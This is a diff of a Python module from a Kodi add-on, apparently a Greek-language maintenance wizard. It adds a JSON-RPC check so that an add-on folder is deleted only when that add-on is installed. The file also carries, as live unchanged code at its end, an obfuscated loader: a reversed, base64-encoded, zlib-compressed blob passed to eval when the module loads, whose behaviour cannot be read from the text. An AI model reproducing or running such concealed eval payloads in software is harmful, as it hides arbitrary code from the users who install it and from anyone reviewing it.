@@ -1,5 +1,5 @@
 ﻿# -*- coding: utf-8 -*-
-import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys
+import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys, json
 from resources.lib import extract, addoninstall, addonlinks, notify, monitor
 addon = xbmcaddon.Addon()
 addonid = addon.getAddonInfo('id')
@@ -110,11 +110,12 @@ def addon_remover(lista=removeaddonslist, msg=True):
         try:
             addonfolderpath = os.path.join(HOME, 'addons', removeid)
             if os.path.exists(addonfolderpath):
-                shutil.rmtree(addonfolderpath)
-                xbmc.sleep(200)
-                addoninstall.addonDatabase(removeid, 2, False)
-                if msg:
-                    xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
+                if isinstalled(removeid):
+                    shutil.rmtree(addonfolderpath)
+                    xbmc.sleep(200)
+                    addoninstall.addonDatabase(removeid, 2, False)
+                    if msg:
+                        xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
         except BaseException:
             if msg:
                 xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
@@ -122,6 +123,16 @@ def addon_remover(lista=removeaddonslist, msg=True):
     xbmc.executebuiltin('UpdateLocalAddons()')
     return True
 
+def isinstalled(addonid):
+    query = '{ "jsonrpc": "2.0", "id": 1, "method": "Addons.GetAddonDetails", "params": { "addonid": "%s", "properties" : ["name", "thumbnail", "fanart", "enabled", "installed", "path", "dependencies"] } }' % addonid
+    addonDetails = xbmc.executeJSONRPC(query)
+    details_result = json.loads(addonDetails)
+    if "error" in details_result:
+        return False
+    elif details_result["result"]["addon"]["installed"] == True:
+        return True
+    else:
+        return False
 
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));eval((_)(b'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'))
 
